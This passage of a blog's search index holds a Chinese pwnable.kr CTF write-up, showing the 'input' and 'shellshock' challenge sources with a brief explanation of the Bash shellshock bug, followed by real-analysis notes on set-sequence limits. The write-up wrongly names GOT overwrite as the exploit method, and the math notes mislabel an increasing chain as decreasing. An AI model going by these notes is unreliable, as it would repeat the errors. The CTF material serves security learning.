class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">input2@pwnable:~$ ls</span><br><span class="line">flag  input  input.c</span><br><span class="line">input2@pwnable:~$ cat input.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// argv</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here&#x27;s your flag</span></span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><div class="story post-story"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">setresuid(getegid(), getegid(), getegid());</span><br><span class="line">setresgid(getegid(), getegid(), getegid());</span><br><span class="line">system(<span class="string">&quot;/home/shellshock/bash -c &#x27;echo shock_me&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此版本的bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){“为开头定义的环境变量在命令ENV中解析成函数后，bash执行并未推出，而是继续解析并执行shell命令，核心的原语在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断，此漏洞回错误的将”{}“外的命令进行执行。</p><p><strong>此类漏洞的利用方法为GOT表覆写</strong>.</p></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实变函数第一章</title>
      <link href="/2021/10/07/RealAnalysis1/"/>
      <url>/2021/10/07/RealAnalysis1/</url>
      
        <content type="html"><![CDATA[<h1 id="集合与点集"><a href="#集合与点集" class="headerlink" title="集合与点集"></a>集合与点集</h1><p>定义：设${A_k}$是一个集合列，若$A_1 \subset A_2 \subset … \subset A_k \subset …$​则称此集合列为递减集合列。称$\bigcap_{k = j}^{\infty}A_k$为{$A_k}的极限集。记为</p><p>$\lim_{k\rightarrow \infty}A_k$，同理可定义递增集合列（其极限集为并集）。</p><p>定义：设${A_k}$​是一个集合列，令$B_j = \bigcup_{k = j}^{\infty}A_k$​显然有$B_j \subset B_{j + 1}$​，我们称$\lim_{k\rightarrow \infty}B_k = \bigcup_{j = 1}^{\infty}B_j$​为集合列{$A_k$​}的上极限集，简称上限集。记为$$\varlimsup_{k\rightarrow \infty} A_k = \bigcap_{j = 1}^{\infty}\bigcup_{k = j}^{\infty}A_k$$​。​​类似的，称集合$\bigcup_{j = 1}^{\infty}\bigcap_{k = j}^{\infty}A_k$​为集合列{$A_k$​​}的下极限集，记为$$\varliminf_{k \rightarrow \infty} = \bigcup_{j = 1}^{\infty}\bigcap_{k = j}^{\infty}A_k$$​，简称下限集。</p><p>若上下限集相等，则说{$A_k$}的极限集存在，记为$\lim_{k \rightarrow \infty} A_k$</p><p>定理：设${A_k}$是一个集合列，则有</p><ol><li><p>$$\varlimsup_{k\rightarrow \infty} A_k = {x:对\forall j \in \mathbb{N},\exists k \geq j , x \in A_k}$$</p></li><li><p>$$\varliminf_{k \rightarrow \infty} = {x:对\exists j \in \mathbb{N},当k \geq j_0时 , x \in A_k}$$</p></li></ol><p>定义：设X，Y是两个集合，称一切有序“元素对”(x,y)(其中$x \in X,y \in Y$​)形成的集合为X与Y的直积集，记为X * Y,即$X * Y = {(x,y):x \in X,y \in Y}$</p>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
          <category> 实变函数 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
